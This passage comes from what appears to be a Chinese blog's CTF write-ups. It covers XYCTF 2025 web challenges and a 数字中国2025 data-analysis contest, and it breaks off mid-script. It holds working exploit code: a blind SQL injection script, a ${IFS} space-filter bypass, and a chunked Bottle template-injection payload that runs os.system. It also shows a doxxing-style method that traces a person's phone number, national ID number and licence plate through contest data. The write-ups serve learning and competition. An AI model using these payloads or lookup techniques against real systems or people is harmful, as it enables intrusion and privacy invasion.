class="string">&quot;admin&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> wrong_code <span class="keyword">in</span> result.text:</span><br><span class="line">                max_num = mid_num</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                min_num = mid_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        mid_num = (min_num + max_num) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid_num &lt;= <span class="number">32</span> <span class="keyword">or</span> mid_num &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid_num) </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><figure><img src="/images/XYCTF2025-Writeup/image-20250409205441709.png"alt="image-20250409205441709" /><figcaption aria-hidden="true">image-20250409205441709</figcaption></figure><figure><img src="/images/XYCTF2025-Writeup/image-20250409211907225.png"alt="image-20250409211907225" /><figcaption aria-hidden="true">image-20250409211907225</figcaption></figure><p>后面可以猜测字段名就是第二个页面要传的参数名secret</p><figure><img src="/images/XYCTF2025-Writeup/image-20250409214302645.png"alt="image-20250409214302645" /><figcaption aria-hidden="true">image-20250409214302645</figcaption></figure><p>进入后续页面发现过滤了空格，这里用${IFS}绕过即可。</p><p>把命令执行的结果重定向到文件中即可</p><p><img src="/images/XYCTF2025-Writeup/image-20250409215112532.png" alt="image-20250409215112532" style="zoom:50%;" /></p><p><img src="/images/XYCTF2025-Writeup/image-20250409215132186.png" alt="image-20250409215132186" style="zoom:50%;" /></p><p><img src="/images/XYCTF2025-Writeup/image-20250409215201850.png" alt="image-20250409215201850" style="zoom:50%;" /></p><figure><img src="/images/XYCTF2025-Writeup/image-20250409215247739.png"alt="image-20250409215247739" /><figcaption aria-hidden="true">image-20250409215247739</figcaption></figure><h4 id="出题人已疯">出题人已疯</h4><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>此处是一个bottle的模板注入，但是限制了payload的长度要小于25。实际上只要把它拆成很多小段塞到一个值里面去，然后一下子执行就好了。</p><p>官方给出的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">3</span>)]</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">    r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/images/XYCTF2025-Writeup/image-20250409201805824.png"alt="image-20250409201805824" /><figcaption aria-hidden="true">image-20250409201805824</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字中国2025 数字产业安全积分争夺赛初赛 数据分析 Writeup+复现</title>
      <link href="/posts/cac6789/"/>
      <url>/posts/cac6789/</url>
      
        <content type="html"><![CDATA[<blockquote><p>六个小时的比赛时间还是太短了，流量分析可惜了，看了下其实并不难，但是一个人看几十万条的大流量分析还是太吃力了......</p><p>好在社工算是ak了，多少拉了点分:) 完了这下成开盒大王了</p></blockquote><h2 id="writeup部分">Writeup部分</h2><h3 id="溯源与取证">溯源与取证</h3><p>别的大师傅做的，这里就写复现里了Orz</p><h3 id="数据社工">数据社工</h3><h4 id="section">1</h4><p>要找的是居住地和公司，根据其他任务已经知道了公司，要找的只有居住地，根据手机号等很容易在打车数据里面找到相关经纬度，从而在地图数据中找到小区。</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410756424-97ecee23-aeea-4750-9fc7-fdd96004e85d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410765112-747d201c-5d8c-462a-85d4-1f583156000f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410772296-23edd9ed-0214-4864-9845-766def3e0cab.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410779964-ca6d87ca-7161-48c3-9853-321b8905fadc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>华润国际E区:闵行区星辰信息技术园</p><h4 id="section-1">2</h4><p>要求找公司名称，通过任务3知道了手机号，在快递单中查找知道了是什么博林科技的</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410837645-6a79c095-47cd-4421-a7d6-44c28cfa7140.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个python脚本在工商登记数据里找博林</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_string_in_multiple_excels</span>(<span class="params">folder_path, target_string</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 存储匹配结果</span></span><br><span class="line">        results = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历 data0.xlsx 到 data99.xlsx</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  <span class="comment"># 从 0 到 99</span></span><br><span class="line">            file_name = <span class="string">f&quot;data<span class="subst">&#123;i&#125;</span>.xlsx&quot;</span></span><br><span class="line">            file_path = os.path.join(folder_path, file_name)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查文件是否存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在检查文件: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 加载 Excel 文件</span></span><br><span class="line">            workbook = openpyxl.load_workbook(file_path)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 遍历所有工作表</span></span><br><span class="line">            <span class="keyword">for</span> sheet_name <span class="keyword">in</span> workbook.sheetnames:</span><br><span class="line">                sheet = workbook[sheet_name]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 遍历工作表中的每个单元格</span></span><br><span class="line">                <span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows():</span><br><span class="line">                    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">                        <span class="keyword">if</span> cell.value <span class="keyword">and</span> target_string <span class="keyword">in</span> <span class="built_in">str</span>(cell.value):</span><br><span class="line">                            <span class="comment"># 如果找到目标字符串，记录文件名、工作表名称、单元格位置和内容</span></span><br><span class="line">                            result = &#123;</span><br><span class="line">                                <span class="string">&quot;文件名&quot;</span>: file_name,</span><br><span class="line">                                <span class="string">&quot;工作表&quot;</span>: sheet_name,</span><br><span class="line">                                <span class="string">&quot;单元格位置&quot;</span>: cell.coordinate,</span><br><span class="line">                                <span class="string">&quot;单元格内容&quot;</span>: cell.value</span><br><span class="line">                            &#125;</span><br><span class="line">                            results.append(result)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;找到匹配项 - 文件: <span class="subst">&#123;file_name&#125;</span>, 工作表: <span class="subst">&#123;sheet_name&#125;</span>, 单元格: <span class="subst">&#123;cell.coordinate&#125;</span>, 内容: <span class="subst">&#123;cell.value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出最终结果</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到匹配的字符串。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n=== 查找结果 ===&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> res <span class="keyword">in</span> results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件: <span class="subst">&#123;res[<span class="string">&#x27;文件名&#x27;</span>]&#125;</span>, 工作表: <span class="subst">&#123;res[<span class="string">&#x27;工作表&#x27;</span>]&#125;</span>, 单元格: <span class="subst">&#123;res[<span class="string">&#x27;单元格位置&#x27;</span>]&#125;</span>, 内容: <span class="subst">&#123;res[<span class="string">&#x27;单元格内容&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    folder_path = <span class="built_in">input</span>(<span class="string">&quot;请输入包含 Excel 文件的文件夹路径: &quot;</span>).strip()</span><br><span class="line">    search_string = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的字符串: &quot;</span>).strip()</span><br><span class="line">    find_string_in_multiple_excels(folder_path, search_string)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410943953-ff79d490-e48d-4568-81bd-d3d0c1446c72.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>江苏博林科技有限公司</p><h4 id="section-2">3</h4><p>要找手机号，已知姓名，去爬取的网页中找</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410966769-c015f2f4-d6b2-477e-a75c-b04320585fec.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>13891889377</p><h4 id="section-3">4</h4><p>要找身份证号，已知手机号，仍然去爬取的网页中找</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743410999957-22ff65c6-13e2-46c6-b94e-30a67217556d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>61050119980416547X</p><h4 id="section-4">5</h4><p>要车牌号，已知手机号，去停车场数据中找，手动硬找，总能找到:)</p><p>578.jpg</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743411061520-8f71fb94-9394-4691-918a-64f4f871900b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>浙B QY318</p><h3 id="数据攻防">数据攻防</h3><h4 id="section-5">1</h4><p>分析流量发现后面有大量的部分是在进行布尔盲注，把注入得到的结果还原出来就好</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743411104648-a4942884-d752-4130-acd9-826b803f2b67.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743411108729-2f619483-00f0-41f9-885a-2c94f1e2031e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>f84c4233dd185ca3c083c7b3dbc4ff8b</p><h3 id="数据跨境">数据跨境</h3><p>完全没来得及看。。。</p><h2 id="复现部分">复现部分</h2><h3 id="溯源与取证-1">溯源与取证</h3><h4 id="section-6">1</h4><p>用ftk挂载就能看到docx文档</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743411691702-6ae343b6-bf77-4eb6-a23c-e46ff8e1bf33.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提取出来打开以后不难发现有一段白色文字，改下颜色就行</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743411894467-dbda13c6-bdea-40ad-9916-9866d7667678.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="section-7">2</h4><p>上面可以看到img里还有个内存.7z，导出以后解压发现是个windows内存镜像。另外还有个log，应该就是题目所说的加密磁盘。通过vol等分析不难发现是truecrypt加密的，用passwarekit恢复一下。</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743413880674-359043cc-05b6-4908-ae98-c1372b5f7426.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>挂载到ftk上就可以看到日志文件，以及我们需要的ip</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743413931445-22fbe853-cd97-4a94-9f55-0eb0532e8d63.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>114.10.143.92</p><h4 id="section-8">3</h4><p>又是一大堆的布尔盲注的日志</p><p>通过观察，先初步筛选一下有用的日志，找到查询id_card且返回包长度为704的</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743429580584-a831e48d-4650-4f87-a383-11e11284d2f9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再找到查询name且返回包长度为704的</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛初赛-数据分析-Writeup-复现/1743429690846-ed99c4f6-bdff-4a2d-96e5-2f620634cda8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写脚本还原攻击者得到的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式定义（编译一次，避免重复编译）</span></span><br><span class="line">LOG_PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(?P&lt;client_ip&gt;\d+\.\d+\.\d+\.\d+)\s-\s-\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;\[(?P&lt;timestamp&gt;.*?)\]\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;method&gt;\w+)\s(?P&lt;path&gt;[^\s]+)\sHTTP/1.1&quot;\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;(?P&lt;status&gt;\d+)\s(?P&lt;size&gt;\d+)\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;referrer&gt;.*?)&quot;\s&#x27;</span></span><br><span class="line">    <span class="string">r&#x27;&quot;(?P&lt;user_agent&gt;.*?)&quot;&#x27;</span></span><br><span class="line">)</span><br><span class="line">SQL_INJ_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;substr\(\((.*?)\),(\d+),\d+\)\)=(\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_logs</span>(<span class="params">file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析日志文件并返回结构化数据&quot;&quot;&quot;</span></span><br><span class="line">    logs = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">match</span> = LOG_PATTERN.<span class="keyword">match</span>(line.strip())</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log = <span class="keyword">match</span>.groupdict()</span><br><span class="line">                    log[<span class="string">&#x27;status&#x27;</span>] = <span class="built_in">int</span>(log[<span class="string">&#x27;status&#x27;</span>])</span><br><span class="line">                    log[<span class="string">&#x27;size&#x27;</span>] = <span class="built_in">int</span>(log[<span class="string">&#x27;size&#x27;</span>])</span><br><span class="line">                    log[<span class="string">&#x27;path&#x27;</span>] = unquote(log[<span class="string">&#x27;path&#x27;</span>])</span><br><span class="line">                    logs.append(log)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 文件 <span class="subst">&#123;file_path&#125;</span> 未找到&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 解析日志时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共解析出 <span class="subst">&#123;<span class="built_in">len</span>(logs)&#125;</span> 条日志&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> logs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_injection_logs</span>(<span class="params">logs: <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;筛选可能包含 SQL 注入的日志&quot;&quot;&quot;</span></span><br><span class="line">    filtered = [</span><br><span class="line">        log <span class="keyword">for</span> log <span class="keyword">in</span> logs </span><br><span class="line">        <span class="keyword">if</span> log[<span class="string">&#x27;path&#x27;</span>].startswith(<span class="string">&#x27;/manager/user/?&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;--&#x27;</span> <span class="keyword">in</span> log[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共筛选出 <span class="subst">&#123;<span class="built_in">len</span>(filtered)&#125;</span> 条注入相关日志&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_blind_sql_data</span>(<span class="params">logs: <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;提取盲注数据并分组&quot;&quot;&quot;</span></span><br><span class="line">    grouped = defaultdict(<span class="keyword">lambda</span>: &#123;<span class="string">&#x27;sql&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;chars&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">        <span class="keyword">match</span> = SQL_INJ_PATTERN.search(log[<span class="string">&#x27;path&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            sql_expr, pos, ascii_val = <span class="keyword">match</span>.groups()</span><br><span class="line">            pos, ascii_val = <span class="built_in">int</span>(pos), <span class="built_in">int</span>(ascii_val)</span><br><span class="line">            key = sql_expr</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 只在第一次设置 SQL 表达式</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> grouped[key][<span class="string">&#x27;sql&#x27;</span>]:</span><br><span class="line">                grouped[key][<span class="string">&#x27;sql&#x27;</span>] = sql_expr</span><br><span class="line">            grouped[key][<span class="string">&#x27;chars&#x27;</span>][pos] = ascii_val</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 共分组 <span class="subst">&#123;<span class="built_in">len</span>(grouped)&#125;</span> 组盲注数据&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(grouped)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_data</span>(<span class="params">grouped: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">any</span>]]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;重建并输出盲注猜测结果&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, info <span class="keyword">in</span> grouped.items():</span><br><span class="line">        sql = info[<span class="string">&#x27;sql&#x27;</span>]</span><br><span class="line">        chars = info[<span class="string">&#x27;chars&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chars:</span><br><span class="line">            